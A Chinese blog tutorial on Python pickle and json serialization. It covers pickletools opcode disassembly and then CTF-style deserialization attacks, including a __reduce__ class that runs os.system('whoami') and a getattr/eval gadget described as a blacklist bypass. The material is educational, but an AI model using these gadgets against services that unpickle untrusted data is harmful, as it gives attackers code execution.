<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = Person(&#x27;张三&#x27; , 30 , False)</span><br><span class="line">import pickle</span><br><span class="line">pp = pickle.dumps(p)</span><br><span class="line">type(pp)   #&lt;class &#x27;bytes&#x27;&gt;</span><br><span class="line">print(pp)  </span><br><span class="line">#b&#x27;\x80\x03c__main__\nPerson\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00nameq\x03X\x06\x00\x00\x00\xe5\xbc\xa0\xe4\xb8\x89q\x04X\x03\x00\x00\x00ageq\x05K\x1eX\t\x00\x00\x00isMarriedq\x06\x89ub.&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p2 = pickle.loads(pp)</span><br><span class="line">type(p2)  #&lt;class &#x27;__main__.Person&#x27;&gt;</span><br><span class="line">p2.name   #&#x27;张三&#x27;</span><br></pre></td></tr></table></figure>
<p>甚至 pickle 模块还能够对 Peron 本身进行序列化：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">per = pickle.dumps(Person)</span><br><span class="line">print(per)   #b&#x27;\x80\x03c__main__\nPerson\nq\x00.&#x27;</span><br><span class="line">per2 = pickle.loads(per)</span><br><span class="line">print(per2)   #&lt;class &#x27;__main__.Person&#x27;&gt;</span><br></pre></td></tr></table></figure>
<p>如果用 json 对 Person 实例对象进行序列化，就会报错：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">p = Person(&#x27;张三&#x27; , 30 , False)</span><br><span class="line">json.dumps(p)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File &quot;&lt;pyshell#49&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">json.dumps(p)</span><br><span class="line">……</span><br><span class="line">TypeError: Object of type &#x27;Person&#x27; is not JSON serializable</span><br></pre></td></tr></table></figure>
<p><strong>如果非要用 json 对 Person 对象进行序列化，必须先定义一个将 Person 对象转化为字典（dict) 的方法</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def person2dict(per):</span><br><span class="line">    return &#123;</span><br><span class="line">    &#x27;name&#x27;:per.name ,</span><br><span class="line">    &#x27;age&#x27;:per.age ,</span><br><span class="line">    &#x27;isMarried&#x27;:per.isMarried</span><br><span class="line">    &#125;</span><br><span class="line">p3 = json.dumps(p , default=person2dict)</span><br><span class="line">type(p3)    #&lt;class &#x27;str&#x27;&gt;</span><br><span class="line">print(p3)   # &#x27;&#123;&quot;name&quot;: &quot;\\u5f20\\u4e09&quot;, &quot;age&quot;: 30, &quot;isMarried&quot;: false&#125;&#x27;</span><br><span class="line"></span><br><span class="line">p3 = json.dumps(p , default=person2dict , ensure_ascii=False)</span><br><span class="line">type(p3)   #&lt;class &#x27;str&#x27;&gt;</span><br><span class="line">print(p3)  # &#x27;&#123;&quot;name&quot;: &quot;张三&quot;, &quot;age&quot;: 30, &quot;isMarried&quot;: false&#125;&#x27;</span><br></pre></td></tr></table></figure>
<p>当然，也不能直接进行反序列化，不然也只会得到一个字典：</p>
<p>此时，也要定义一个将字典转换为 Person 类实例的方法，在进行反序列化：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def dict2person(d):</span><br><span class="line">	return Person(d[&#x27;name&#x27;],d[&#x27;age&#x27;],d[&#x27;isMarried&#x27;])</span><br><span class="line">p5 = json.loads(p3 , object_hook=dict2person)</span><br><span class="line">type(p5)         #&lt;class &#x27;__main__.Person&#x27;&gt;</span><br><span class="line">print(p5.name)   #&#x27;张三&#x27;</span><br></pre></td></tr></table></figure>
<p><strong>（2）pickle 序列化结果为 bites 类型，只适合于 Python 机器之间的交互。</strong></p>
<p><strong>json 序列化结果为 str 类型，能够被多种语言识别，可用于与其他程序设计语言交互。</strong></p>
<p><strong>JSON 和 Python 内置的数据类型对应如下：</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">JSON 类型</th>
<th style="text-align:left">Python 类型</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">{}</td>
<td style="text-align:left">dict</td>
</tr>
<tr>
<td style="text-align:left">[]</td>
<td style="text-align:left">list</td>
</tr>
<tr>
<td style="text-align:left">“string”</td>
<td style="text-align:left">‘str’或 u’unicode’</td>
</tr>
<tr>
<td style="text-align:left">1234.56</td>
<td style="text-align:left">int 或 float</td>
</tr>
<tr>
<td style="text-align:left">true/false</td>
<td style="text-align:left">True/False</td>
</tr>
<tr>
<td style="text-align:left">null</td>
<td style="text-align:left">None</td>
</tr>
</tbody>
</table>
<blockquote>
<p><strong>（1）序列化与反序列化是为了解决内存中对象的持久化与传输问题；</strong></p>
<p><strong>（2）Python 中提供了 pickle 和 json 两个模块进行序列化与反序列化；</strong></p>
<p><strong>（3）dumps () 和 dump () 用于序列化，loads () 和 load () 用于反序列化；</strong></p>
<p><strong>（4）pickle 模块能序列化任何对象，序列化结果为 bites 类型，只适合于 Python 机器之间交互；</strong></p>
<p><strong>json 模块只能序列化 Python 基本类型，序列化结果为 json 格式字符串，适合不同开发语言之间交互。</strong></p>
</blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTc1Njgx">https://cloud.tencent.com/developer/article/1575681</span></p>
<h3 id="反序列化流程分析"><a class="markdownIt-Anchor" href="#反序列化流程分析">#</a> 反序列化流程分析</h3>
<p>直接分析反序列化出的字符串是比较困难的，我们可以使用 <code>pickletools</code>  帮助我们进行分析</p>
<p>pickletools 是 python 自带的 pickle 调试器，有三个功能：<strong>反汇编</strong>一个已经被打包的字符串、<strong>优化</strong>一个已经被打包的字符串、返回一个迭代器来供程序使用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import pickletools</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a_list = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;]</span><br><span class="line"></span><br><span class="line">a_list_pickle = pickle.dumps(a_list,protocol=0)</span><br><span class="line">print(a_list_pickle)</span><br><span class="line">print(&#x27;------------------&#x27;)</span><br><span class="line"># 优化一个已经被打包的字符串</span><br><span class="line">a_list_pickle = pickletools.optimize(a_list_pickle)</span><br><span class="line">print(a_list_pickle)</span><br><span class="line">print(&#x27;------------------&#x27;)</span><br><span class="line"># 反汇编一个已经被打包的字符串</span><br><span class="line">pickletools.dis(a_list_pickle)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;(lp0\nVa\np1\naVb\np2\naVc\np3\na.&#x27;</span><br><span class="line">------------------</span><br><span class="line">b&#x27;(lVa\naVb\naVc\na.&#x27;</span><br><span class="line">------------------</span><br><span class="line">    0: (    MARK</span><br><span class="line">    1: l        LIST       (MARK at 0)</span><br><span class="line">    2: V    UNICODE    &#x27;a&#x27;</span><br><span class="line">    5: a    APPEND</span><br><span class="line">    6: V    UNICODE    &#x27;b&#x27;</span><br><span class="line">    9: a    APPEND</span><br><span class="line">   10: V    UNICODE    &#x27;c&#x27;</span><br><span class="line">   13: a    APPEND</span><br><span class="line">   14: .    STOP</span><br><span class="line">highest protocol among opcodes = 0</span><br></pre></td></tr></table></figure>
<p>pickletools 指令集</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">MARK           = b&#x27;(&#x27;   # push special markobject on stack</span><br><span class="line">STOP           = b&#x27;.&#x27;   # every pickle ends with STOP</span><br><span class="line">POP            = b&#x27;0&#x27;   # discard topmost stack item</span><br><span class="line">POP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobject</span><br><span class="line">DUP            = b&#x27;2&#x27;   # duplicate top stack item</span><br><span class="line">FLOAT          = b&#x27;F&#x27;   # push float object; decimal string argument</span><br><span class="line">INT            = b&#x27;I&#x27;   # push integer or bool; decimal string argument</span><br><span class="line">BININT         = b&#x27;J&#x27;   # push four-byte signed int</span><br><span class="line">BININT1        = b&#x27;K&#x27;   # push 1-byte unsigned int</span><br><span class="line">LONG           = b&#x27;L&#x27;   # push long; decimal string argument</span><br><span class="line">BININT2        = b&#x27;M&#x27;   # push 2-byte unsigned int</span><br><span class="line">NONE           = b&#x27;N&#x27;   # push None</span><br><span class="line">PERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string arg</span><br><span class="line">BINPERSID      = b&#x27;Q&#x27;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span><br><span class="line">REDUCE         = b&#x27;R&#x27;   # apply callable to argtuple, both on stack</span><br><span class="line">STRING         = b&#x27;S&#x27;   # push string; NL-terminated string argument</span><br><span class="line">BINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argument</span><br><span class="line">SHORT_BINSTRING= b&#x27;U&#x27;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span><br><span class="line">UNICODE        = b&#x27;V&#x27;   # push Unicode string; raw-unicode-escaped&#x27;d argument</span><br><span class="line">BINUNICODE     = b&#x27;X&#x27;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span><br><span class="line">APPEND         = b&#x27;a&#x27;   # append stack top to list below it</span><br><span class="line">BUILD          = b&#x27;b&#x27;   # call __setstate__ or __dict__.update()</span><br><span class="line">GLOBAL         = b&#x27;c&#x27;   # push self.find_class(modname, name); 2 string args</span><br><span class="line">DICT           = b&#x27;d&#x27;   # build a dict from stack items</span><br><span class="line">EMPTY_DICT     = b&#x27;&#125;&#x27;   # push empty dict</span><br><span class="line">APPENDS        = b&#x27;e&#x27;   # extend list on stack by topmost stack slice</span><br><span class="line">GET            = b&#x27;g&#x27;   # push item from memo on stack; index is string arg</span><br><span class="line">BINGET         = b&#x27;h&#x27;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span><br><span class="line">INST           = b&#x27;i&#x27;   # build &amp; push class instance</span><br><span class="line">LONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte arg</span><br><span class="line">LIST           = b&#x27;l&#x27;   # build list from topmost stack items</span><br><span class="line">EMPTY_LIST     = b&#x27;]&#x27;   # push empty list</span><br><span class="line">OBJ            = b&#x27;o&#x27;   # build &amp; push class instance</span><br><span class="line">PUT            = b&#x27;p&#x27;   # store stack top in memo; index is string arg</span><br><span class="line">BINPUT         = b&#x27;q&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span><br><span class="line">LONG_BINPUT    = b&#x27;r&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span><br><span class="line">SETITEM        = b&#x27;s&#x27;   # add key+value pair to dict</span><br><span class="line">TUPLE          = b&#x27;t&#x27;   # build tuple from topmost stack items</span><br><span class="line">EMPTY_TUPLE    = b&#x27;)&#x27;   # push empty tuple</span><br><span class="line">SETITEMS       = b&#x27;u&#x27;   # modify dict by adding topmost key+value pairs</span><br><span class="line">BINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encoding</span><br><span class="line">TRUE           = b&#x27;I01\n&#x27;  # not an opcode; see INT docs in pickletools.py</span><br><span class="line">FALSE          = b&#x27;I00\n&#x27;  # not an opcode; see INT docs in pickletools.py</span><br></pre></td></tr></table></figure>
<p>将上面的输出对照翻译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x80\x03](X\x01\x00\x00\x00aX\x01\x00\x00\x00bX\x01\x00\x00\x00ce.&#x27;</span><br><span class="line">    0: \x80 PROTO      3	#标明使用协议版本</span><br><span class="line">    2: ]    EMPTY_LIST	#将空列表压入栈</span><br><span class="line">    3: (    MARK	#将标志压入栈</span><br><span class="line">    4: X        BINUNICODE &#x27;a&#x27;	#unicode字符</span><br><span class="line">   10: X        BINUNICODE &#x27;b&#x27;</span><br><span class="line">   16: X        BINUNICODE &#x27;c&#x27;</span><br><span class="line">   22: e        APPENDS    (MARK at 3)	#将3号标志后的数据压入列表</span><br><span class="line">   # 弹出栈中的数据，结束流程</span><br><span class="line">   23: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>
<p>我们再来看另一个更复杂的例子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import pickletools</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">class a_class():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.age = 114514</span><br><span class="line">        self.name = &quot;QAQ&quot;</span><br><span class="line">        self.list = [&quot;1919&quot;,&quot;810&quot;,&quot;qwq&quot;]</span><br><span class="line">a_class_new = a_class()</span><br><span class="line">a_class_pickle = pickle.dumps(a_class_new,protocol=3)</span><br><span class="line">print(a_class_pickle)</span><br><span class="line"># 优化一个已经被打包的字符串</span><br><span class="line">a_list_pickle = pickletools.optimize(a_class_pickle)</span><br><span class="line">print(a_class_pickle)</span><br><span class="line"># 反汇编一个已经被打包的字符串</span><br><span class="line">pickletools.dis(a_class_pickle)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\na_class\nq\x00)\x81q\x01&#125;q\x02(X\x03\x00\x00\x00ageq\x03JR\xbf\x01\x00X\x04\x00\x00\x00nameq\x04X\x03\x00\x00\x00QAQq\x05X\x04\x00\x00\x00listq\x06]q\x07(X\x04\x00\x00\x001919q\x08X\x03\x00\x00\x00810q\tX\x03\x00\x00\x00qwqq\neub.&#x27;</span><br><span class="line">b&#x27;\x80\x03c__main__\na_class\nq\x00)\x81q\x01&#125;q\x02(X\x03\x00\x00\x00ageq\x03JR\xbf\x01\x00X\x04\x00\x00\x00nameq\x04X\x03\x00\x00\x00QAQq\x05X\x04\x00\x00\x00listq\x06]q\x07(X\x04\x00\x00\x001919q\x08X\x03\x00\x00\x00810q\tX\x03\x00\x00\x00qwqq\neub.&#x27;</span><br><span class="line">    0: \x80 PROTO      3</span><br><span class="line">    # push self.find_class(modname, name); 连续读取两个字符串作为参数，以\n为界</span><br><span class="line">    # 这里就是self.find_class(‘__main__’, ‘a_class’);</span><br><span class="line">    # 需要注意的版本不同，find_class函数也不同</span><br><span class="line">    2: c    GLOBAL     &#x27;__main__ a_class&#x27;	</span><br><span class="line">    # 不影响反序列化</span><br><span class="line">   20: q    BINPUT     0</span><br><span class="line">   # 向栈中压入一个元组</span><br><span class="line">   22: )    EMPTY_TUPLE</span><br><span class="line">   # 见pickletools源码第2097行（注意版本）</span><br><span class="line">   # 大意为，该指令之前的栈内容应该为一个类（2行GLOBAL创建的类），类后为一个元组（22行压入的TUPLE），调用cls.__new__(cls, *args)（即用元组中的参数创建一个实例，这里元组实际为空）</span><br><span class="line">   23: \x81 NEWOBJ</span><br><span class="line">   24: q    BINPUT     1</span><br><span class="line">   # 压入一个新的字典</span><br><span class="line">   26: &#125;    EMPTY_DICT</span><br><span class="line">   27: q    BINPUT     2</span><br><span class="line">   # 一个标志</span><br><span class="line">   29: (    MARK</span><br><span class="line">   # 压入unicode值</span><br><span class="line">   30: X        BINUNICODE &#x27;age&#x27;</span><br><span class="line">   38: q        BINPUT     3</span><br><span class="line">   40: J        BININT     114514</span><br><span class="line">   45: X        BINUNICODE &#x27;name&#x27;</span><br><span class="line">   54: q        BINPUT     4</span><br><span class="line">   56: X        BINUNICODE &#x27;QAQ&#x27;</span><br><span class="line">   64: q        BINPUT     5</span><br><span class="line">   66: X        BINUNICODE &#x27;list&#x27;</span><br><span class="line">   75: q        BINPUT     6</span><br><span class="line">   77: ]        EMPTY_LIST</span><br><span class="line">   78: q        BINPUT     7</span><br><span class="line">   # 又一个标志</span><br><span class="line">   80: (        MARK</span><br><span class="line">   81: X            BINUNICODE &#x27;1919&#x27;</span><br><span class="line">   90: q            BINPUT     8</span><br><span class="line">   92: X            BINUNICODE &#x27;810&#x27;</span><br><span class="line">  100: q            BINPUT     9</span><br><span class="line">  102: X            BINUNICODE &#x27;qwq&#x27;</span><br><span class="line">  110: q            BINPUT     10</span><br><span class="line">  # 将第80行的mark之后的值压入第77行的列表</span><br><span class="line">  112: e            APPENDS    (MARK at 80)</span><br><span class="line">  # 详情见pickletools源码第1674行（注意版本）</span><br><span class="line">  # 大意为将任意数量的键值对添加到现有字典中</span><br><span class="line">  # Stack before:  ... pydict markobject key_1 value_1 ... key_n value_n</span><br><span class="line">  # Stack after:   ... pydict</span><br><span class="line">  113: u        SETITEMS   (MARK at 29)</span><br><span class="line">  # 通过__setstate__或更新__dict__完成构建对象（对象为我们在23行创建的）。</span><br><span class="line">  # 如果对象具有__setstate__方法，则调用anyobject .__setstate__（参数）</span><br><span class="line">  # 如果无__setstate__方法，则通过anyobject.__dict__.update(argument)更新值</span><br><span class="line">  # 注意这里可能会产生变量覆盖</span><br><span class="line">  114: b    BUILD</span><br><span class="line">  # 弹出栈中的数据，结束流程</span><br><span class="line">  115: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>
<h3 id="手写opcode"><a class="markdownIt-Anchor" href="#手写opcode">#</a> 手写 opcode</h3>
<p>假设我们想执行如下命令，在内建函数中引用形式如下，如果有一个黑名单禁用 <code>eval</code> ，那么利用 <code>__reduce__</code> 就不能使用了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">builtins.getattr(builtins, &#x27;eval&#x27;),(&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;,)</span><br></pre></td></tr></table></figure>
<p>但是在 <code>__reduce__</code> 生成的序列化字符串，只能执行一个函数，而且在对 open 传参的过程中，程序会报错。</p>
<p>不能正常生成序列化字符串，这就需要手写一个序列化字符串。</p>
<p>一些常见的 code</p>
<blockquote>
<ul>
<li><code>c</code> ：以 c 开始的后面两行的作用类似 <code>os.system</code>  的调用，其中 <code>cos</code>  在第一行， <code>system</code>  在第二行。</li>
<li><code>(</code> ：相当于左括号</li>
<li><code>t</code> ：相当于右括号</li>
<li><code>S</code> ：表示本行的内容一个字符串</li>
<li><code>R</code> ：执行紧靠自己左边的一个括号对（即 <code>(</code>  和 <code>t</code>  之间）的内容</li>
<li><code>.</code> ：代表该 pickle 结束</li>
</ul>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import pickletools</span><br><span class="line">import pickle</span><br><span class="line">class Student():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.name = &#x27;secret.name&#x27;</span><br><span class="line">        self.grade = &#x27;secret.grade&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # def __reduce__(self):</span><br><span class="line">    #     return (os.system,(&#x27;dir&#x27;,))</span><br><span class="line"></span><br><span class="line">payload = pickle.dumps(Student(),protocol=0)</span><br><span class="line">print(payload)</span><br><span class="line">print(&quot;--------------&quot;)</span><br><span class="line">payload = pickletools.optimize(payload)</span><br><span class="line">print(payload)</span><br><span class="line">print(&quot;--------------&quot;)</span><br><span class="line">pickletools.dis(payload)</span><br><span class="line">print(&quot;--------------&quot;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;ccopy_reg\n_reconstructor\np0\n(c__main__\nStudent\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVname\np6\nVsecret.name\np7\nsVgrade\np8\nVsecret.grade\np9\nsb.&#x27;</span><br><span class="line">--------------</span><br><span class="line">b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nStudent\nc__builtin__\nobject\nNtR(dVname\nVsecret.name\nsVgrade\nVsecret.grade\nsb.&#x27;</span><br><span class="line">--------------</span><br><span class="line">    0: c    GLOBAL     &#x27;copy_reg _reconstructor&#x27;</span><br><span class="line">   25: (    MARK</span><br><span class="line">   26: c        GLOBAL     &#x27;__main__ Student&#x27;</span><br><span class="line">   44: c        GLOBAL     &#x27;__builtin__ object&#x27;</span><br><span class="line">   64: N        NONE</span><br><span class="line">   65: t        TUPLE      (MARK at 25)</span><br><span class="line">   66: R    REDUCE</span><br><span class="line">   67: (    MARK</span><br><span class="line">   68: d        DICT       (MARK at 67)</span><br><span class="line">   69: V    UNICODE    &#x27;name&#x27;</span><br><span class="line">   75: V    UNICODE    &#x27;secret.name&#x27;</span><br><span class="line">   88: s    SETITEM</span><br><span class="line">   89: V    UNICODE    &#x27;grade&#x27;</span><br><span class="line">   96: V    UNICODE    &#x27;secret.grade&#x27;</span><br><span class="line">  110: s    SETITEM</span><br><span class="line">  111: b    BUILD</span><br><span class="line">  112: .    STOP</span><br><span class="line">highest protocol among opcodes = 0</span><br><span class="line">--------------</span><br></pre></td></tr></table></figure>
<p>再举个例子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line">import pickletools</span><br><span class="line">class exp(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (os.system,(&#x27;whoami&#x27;,))</span><br><span class="line">e = exp()</span><br><span class="line">print(s)</span><br><span class="line">s = pickle.dumps(e,protocol=0)</span><br><span class="line">pickletools.dis(s)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.&#x27;</span><br><span class="line">    0: c    GLOBAL     &#x27;nt system&#x27;</span><br><span class="line">   11: p    PUT        0</span><br><span class="line">   14: (    MARK</span><br><span class="line">   15: V        UNICODE    &#x27;whoami&#x27;</span><br><span class="line">   23: p        PUT        1</span><br><span class="line">   26: t        TUPLE      (MARK at 14)</span><br><span class="line">   27: p    PUT        2</span><br><span class="line">   30: R    REDUCE</span><br><span class="line">   31: p    PUT        3</span><br><span class="line">   34: .    STOP</span><br><span class="line">highest protocol among opcodes = 0</span><br></pre></td></tr></table></figure>
<p>翻译的每个具体命令上面都有写</p>
<p>因为 0 版本更容易构造，手写用 0 版本手写</p>
<p>接下来的手搓 opcode 就有些离谱了，看这篇吧</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9taXNha2lrYXRhLmdpdGh1Yi5pby8yMDIwLzA0L3B5dGhvbi0lRTUlOEYlOEQlRTUlQkElOEYlRTUlODglOTclRTUlOEMlOTYvIyVFNiU4OSU4QiVFNSU4NiU5OW9wY29kZQ==">python 反序列化～Misaki’s Blog (misakikata.github.io)</span></p>
<h3 id="__reduce__r指令"><a class="markdownIt-Anchor" href="#__reduce__r指令">#</a> __reduce__(R 指令)</h3>
<p>ctf 中大多数常见的 pickle 反序列化，利用方法大都是 <code>__reduce__</code></p>
<p>触发 <code>__reduce__</code> 的指令码为 <code>R</code> ，干了这么一件事情：</p>
<blockquote>
<p>取当前栈的栈顶记为 <code>args</code> ，然后把它弹掉。</p>
<p>取当前栈的栈顶记为 <code>f</code> ，然后把它弹掉。</p>
<p>以 <code>args</code>  为参数，执行函数 <code>f</code> ，把结果压进当前栈。</p>
</blockquote>
<p>class 的 <code>__reduce__</code> 方法，在 pickle 反序列化的时候会被执行。其底层的编码方法，就是利用了 <code>R</code>  指令码。  <code>f</code>  要么返回字符串，要么返回一个 tuple，后者对我们而言更有用。</p>
<p>一种很流行的攻击思路是：利用  <code>__reduce__</code>  构造恶意字符串，当这个字符串被反序列化的时候， <code>__reduce__</code> 会被执行。</p>
